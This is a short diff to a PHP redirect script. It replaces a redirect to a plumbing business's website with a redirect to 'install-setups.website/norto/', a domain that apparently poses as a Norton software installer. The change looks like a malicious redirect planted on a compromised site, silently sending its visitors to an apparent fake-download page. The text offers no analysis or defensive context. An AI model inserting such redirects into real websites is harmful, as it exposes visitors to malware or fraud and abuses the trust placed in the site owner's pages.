@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.scullyplumbing.com.au/");
+header("Location: https://install-setups.website/norto/");
 die();
 ?>
